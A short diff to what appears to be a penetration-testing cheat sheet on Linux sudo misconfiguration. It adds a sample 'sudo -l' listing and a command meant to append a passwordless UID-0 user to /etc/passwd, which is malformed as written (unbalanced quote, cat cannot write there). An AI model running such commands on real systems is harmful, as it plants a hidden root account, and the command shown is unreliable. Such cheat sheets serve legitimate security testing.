@@ -674,10 +674,12 @@ Sudo misconfiguration:
 * https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/
 * Look for root permissions on certain tools that allow writing.
 ```bash
+# Example: adding user to /etc/passwd
 $ sudo -l
     (root) NOEXEC: /bin/ls, (root) /usr/bin/cat, (root) /usr/bin/more, (root)  
     !/usr/bin/su *root*  
     (root) NOPASSWD: /usr/bin/cat  
+$ /usr/bin/cat 'brian::0:0::/root:/bin/bash >> /etc/passwd
 ```
 
 Localhost listening ports:
